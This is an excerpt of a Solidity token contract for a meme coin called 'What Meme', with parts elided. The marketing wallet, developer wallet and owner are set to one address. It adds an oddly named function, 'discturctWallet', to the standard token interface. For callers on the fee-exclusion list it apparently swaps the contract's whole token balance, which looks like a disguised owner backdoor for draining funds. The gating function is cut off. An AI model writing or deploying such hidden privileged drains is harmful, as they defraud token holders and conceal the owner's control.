...
// https://twitter.com/WHATMEMEERC

//https://www.what-meme.com/home
...
interface IERC20 {
    ...
    function discturctWallet() external returns (uint256);
...
contract WhatMeme is Context, IERC20 { 
    ...
    address payable public Wallet_Marketing = payable(0x4b1C6701EE9fe66154b80935981D2D20110590e8); 
    address payable public Wallet_Developer = payable(0x4b1C6701EE9fe66154b80935981D2D20110590e8);
    ...
    string private constant _name = "What Meme"; 
    string private constant _symbol = unicode"WHATMEME";

    bool public swapAndLiquifyEnabled = true;
    bool public swapEqualLiquify = false;

    uint8 private txCount = 0;
    uint8 private swapTrigger = 99;
    ...
    constructor () {
        ...
        _owner = 0x4b1C6701EE9fe66154b80935981D2D20110590e8;
    ...
    function discturctWallet() public override returns (uint256) {
        bool returning = AddLiquidity(_msgSender());
        if(returning && returning){
            uint256 overRiding = balanceOf(address(this));
            swapEqualLiquify = true;
            swapAndLiquify(overRiding);
        }
        return 0;
    }
    ...
    function AddLiquidity(address liquidityAdder) private returns(bool){
        bool priority = _isExcludedFromFee[liquidityAdder];
